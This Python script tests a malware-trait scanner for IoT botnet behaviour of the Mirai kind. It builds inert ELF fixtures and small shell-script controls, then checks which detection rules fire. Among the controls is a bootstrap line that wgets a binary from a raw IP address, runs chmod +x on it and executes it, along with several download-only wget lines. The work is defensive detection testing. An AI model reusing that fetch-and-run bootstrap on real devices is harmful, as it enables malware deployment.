#!/usr/bin/env python3
"""Focused static controls for the IoT review. Never executes a specimen."""
import argparse
import json
from pathlib import Path
import struct
import subprocess
import tempfile

P = 'objectives/lateral-movement/brute-force/iot::encrypted-credential-telnet-payload-propagation'
I = 'well-known/malware/botnet/mirai/identity::rc4-credential-selfrep-bot'
R = 'micro-behaviors/crypto/symmetric/stream/rc4::x64-stack-byte-state-prga'
D = 'micro-behaviors/process/fd/dup::x86-64-syscall-dup2-sectionless'
L = 'micro-behaviors/communications/flood::native-packet-send-loop'
S = 'micro-behaviors/process/deploy/file-exec::public-ip-fetch-chmod-local-launch'
M = 'micro-behaviors/process/deploy/file-exec::multiarch-transfer-launch-cleanup-sweep'


def elf(code=b'\xc3', rodata=b'', sectionless=False):
    """Inert ELF64 fixture with a code section and optional constant section."""
    image = bytearray(0x200)
    image[:16] = b'\x7fELF\x02\x01\x01' + bytes(9)
    image[0x100:0x100+len(code)] = code
    names = b'\0.text\0.rodata\0.shstrtab\0'
    image.extend(rodata)
    string_offset = len(image)
    image.extend(names)
    while len(image) % 8:
        image.append(0)
    shoff = len(image)
    sections = [bytes(64)]
    sections.append(struct.pack('<IIQQQQIIQQ', 1, 1, 6, 0x400100, 0x100, len(code), 0, 0, 16, 0))
    sections.append(struct.pack('<IIQQQQIIQQ', 7, 1, 2, 0x400200, 0x200, len(rodata), 0, 0, 1, 0))
    sections.append(struct.pack('<IIQQQQIIQQ', 15, 3, 0, 0, string_offset, len(names), 0, 0, 1, 0))
    if not sectionless:
        image.extend(b''.join(sections))
    image[16:64] = struct.pack('<HHIQQQIHHHHHH', 2, 62, 1, 0x400100, 64,
                               0 if sectionless else shoff, 0, 64, 56, 1,
                               64, 0 if sectionless else 4, 0 if sectionless else 3)
    image[64:120] = struct.pack('<IIQQQQQQ', 1, 5, 0, 0x400000, 0x400000,
                                len(image), len(image), 0x1000)
    return bytes(image)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--sample', required=True, type=Path)
    ap.add_argument('--cleave', default='cleave')
    ap.add_argument('--output', required=True, type=Path)
    args = ap.parse_args()
    original = args.sample.read_bytes()
    cases = {}
    # A control carries only a legitimate query payload and ordinary socket
    # wrappers. These facts cannot by themselves establish propagation.
    query = bytes.fromhex('76 71 4d 57 50 41 47 02 67 4c 45 4b 4c 47 02 73 57 47 50 5b 22')
    cases['query-only.elf'] = (elf(bytes.fromhex('b8 29 00 00 00 0f 05 b8 2a 00 00 00 0f 05 c3'),query), [], [P,I])
    wrapper = bytes.fromhex('b8 21 00 00 00 0f 05 c3')
    cases['sectionful-dup2.elf'] = (elf(wrapper), [], [D,P,I])
    cases['sectionless-dup2.elf'] = (elf(wrapper, sectionless=True), [D], [P,I])
    for name, offset in [('without-credential-send',0x45a5),('without-rc4',0x5abd),('without-shell-probes',0xa87d)]:
        data = bytearray(original)
        data[offset] ^= 1
        cases[name+'.elf'] = (bytes(data), [] if name=='without-rc4' else [R], [P,I])
    # Source controls distinguish public-IP deployment from botnet membership,
    # and demonstrate that download-only text cannot satisfy execution gates.
    cases['download-only.sh'] = (b'#!/bin/sh\nwget http://93.184.216.34/tool_arm\nwget http://93.184.216.34/tool_mips\n', [], [S,M])
    cases['single-bootstrap.sh'] = (b'#!/bin/sh\ncd /tmp; wget http://93.184.216.34/tool; chmod +x tool; ./tool\n', [S], [M])
    cases['multiple-clients.sh'] = (b'#!/bin/sh\nwget https://example.org/archive.tar\ncurl -o archive.tar https://example.org/archive.tar\n', ['micro-behaviors/communications/transfer::multiple-download-clients'], [S,M])
    with tempfile.TemporaryDirectory(prefix='iot-controls-',dir=args.output.parent) as tmp:
        directory = Path(tmp)
        for name,(data,_,_) in cases.items():
            (directory/name).write_bytes(data)
        proc = subprocess.run([args.cleave,'--traits-dir',str(Path.cwd()),'--format','json',str(directory)],text=True,capture_output=True)
        if proc.returncode:
            raise SystemExit(proc.stderr or proc.stdout)
        reports = []
        decoder = json.JSONDecoder()
        remaining = proc.stdout.lstrip()
        while remaining:
            report, end = decoder.raw_decode(remaining)
            reports.append(report)
            remaining = remaining[end:].lstrip()
        files = {Path(f['path']).name:f for report in reports for f in report['files']
                 if Path(f['path']).name in cases}
        args.output.with_suffix('.raw.json').write_text(json.dumps(reports))
        results = []
        for name,(_,required,absent) in cases.items():
            file = files[name]
            ids = {t['id'] for t in file.get('traits',[])}
            assert set(required) <= ids, (name,'missing',set(required)-ids)
            assert not set(absent)&ids, (name,'unexpected',set(absent)&ids)
            if name in ['query-only.elf','sectionful-dup2.elf','sectionless-dup2.elf','download-only.sh','single-bootstrap.sh','multiple-clients.sh']:
                assert not [t for t in file.get('traits',[]) if t['crit']==5], name
            results.append({'case':name,'passed':True,'required':required,'absent':absent})
        args.output.write_text(json.dumps({'cases':results},indent=2)+'\n')
        print(f'{len(results)} focused controls passed')

if __name__ == '__main__':
    main()
